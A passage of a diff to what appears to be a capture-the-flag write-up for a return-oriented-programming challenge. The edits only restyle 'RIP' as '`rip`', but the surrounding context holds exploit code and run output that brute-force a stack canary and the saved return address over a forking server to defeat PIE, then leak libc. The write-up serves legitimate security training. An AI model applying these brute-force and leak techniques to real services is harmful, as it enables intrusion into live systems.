 # read() writes exactly what we send; unwritten bytes retain their original stack
 # values. Oracle identical to Stage 1.
-print('[*] Stage 2: Brute-forcing saved RIP...')
+print('[*] Stage 2: Brute-forcing saved `rip`...')
 
 known_rip = rip_fixed
 for i in range(5):
@@ -13633,7 +13633,7 @@ for i in range(5):
         except Exception:
             pass
     if not found_byte:
-        print(f'[!] Failed at RIP byte {i+1}')
+        print(f'[!] Failed at `rip` byte {i+1}')
         exit()
 
 saved_rip   = u64(known_rip + b'\x00\x00')
@@ -13701,7 +13701,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python ~/script.py
 [+] Byte 6: 0x89 | canary: 0x00e90237c97b89
 [+] Byte 7: 0x46 | canary: 0x00e90237c97b8946
 [*] Canary: 0x46897bc93702e900
-[*] Stage 2: Brute-forcing saved RIP...
+[*] Stage 2: Brute-forcing saved `rip`...
 [+] Byte 1: 0x7a | rip: 0xd37a
 [+] Byte 2: 0xe4 | rip: 0xd37ae4
 [+] Byte 3: 0x7b | rip: 0xd37ae47b
@@ -13744,9 +13744,9 @@ Four problems to solve: canary, PIE, libc, and privilege. The server forks a chi
 
 The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 -> binary base
+#### Stage 2: Leaking the binary's base by brute-forcing saved `rip` bytes 1–5 -> binary base
 
-`read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved RIP in `challenge()`'s frame equals `binary_base + 0x1726`. Byte 0 (`0x26`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved RIP bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved RIP is valid.
+`read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved `rip` in `challenge()`'s frame equals `binary_base + 0x1726`. Byte 0 (`0x26`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved `rip` bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved `rip` is valid.
 
 #### Stage 3: Leak libc base via `puts(puts@got)`
 
@@ -13838,7 +13838,7 @@ Breakpoint hit at 0x5f97bb53f532
  R15  0
  RBP  0x7ffdc145e240 —▸ 0x7ffdc145e2a0 ◂— 0
  RSP  0x7ffdc145e1c0 ◂— 0xd68 /* 'h\r' */
- RIP  0x5f97bb53f532 (challenge+55) ◂— call read@plt
+ `rip`  0x5f97bb53f532 (challenge+55) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
  ► 0x5f97bb53f532 <challenge+55>    call   read@plt                    <read@plt>
         fd: 0 (socket:[1409589517])
@@ -13991,15 +13991,15 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib
 
 ### Leaking binary base
 
-The saved RIP in `challenge()`'s frame comes from the backtrace:
+The saved `rip` in `challenge()`'s frame comes from the backtrace:
 
 ```
 1   0x5f97bb53f726 main+457
 ```
 
-`challenge()`'s saved RIP = `0x5f97bb53f726` = `binary_base + 0x1726`. Byte 0 is `0x26` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
+`challenge()`'s saved `rip` = `0x5f97bb53f726` = `binary_base + 0x1726`. Byte 0 is `0x26` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
 
-By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved RIP and compute:
+By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved `rip` and compute:
 
 ```
 binary_base = saved_rip - 0x1726
@@ -14054,7 +14054,7 @@ ret_off       = 0x101a    # ret (stack alignment)
 canary_off = 72
 rip_off    = 88
 
-# Byte 0 of saved RIP is fixed: binary_base & 0xFF == 0, so RET_ADDR & 0xFF
+# Byte 0 of saved `rip` is fixed: binary_base & 0xFF == 0, so RET_ADDR & 0xFF
 rip_fixed = bytes([ret_addr_off & 0xFF])   # [0x26]
 
 def connect():
@@ -14087,10 +14087,10 @@ for i in range(7):
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
-# --- STAGE 2: Brute-force saved RIP bytes 1–5 → binary base ---
+# --- STAGE 2: Leaking the binary's base by brute-forcing saved `rip` bytes 1–5 → binary base ---
 # read() writes exactly what we send; unwritten bytes retain their original stack
 # values. Oracle identical to Stage 1.
-print('[*] Stage 2: Brute-forcing saved RIP...')
+print('[*] Stage 2: Brute-forcing saved `rip`...')
 
 known_rip = rip_fixed
 for i in range(5):
@@ -14114,7 +14114,7 @@ for i in range(5):
         except Exception:
             pass
     if not found_byte:
-        print(f'[!] Failed at RIP byte {i+1}')
+        print(f'[!] Failed at `rip` byte {i+1}')
         exit()
 
 saved_rip   = u64(known_rip + b'\x00\x00')
@@ -14185,7 +14185,7 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ python ~/script.py
 [+] Byte 6: 0x9b | canary: 0x00b55dd2b9349b
 [+] Byte 7: 0xe1 | canary: 0x00b55dd2b9349be1
 [*] Canary: 0xe19b34b9d25db500
-[*] Stage 2: Brute-forcing saved RIP...
+[*] Stage 2: Brute-forcing saved `rip`...
 [+] Byte 1: 0x67 | rip: 0x2667
 [+] Byte 2: 0x3b | rip: 0x26673b
 [+] Byte 3: 0xe3 | rip: 0x26673be3
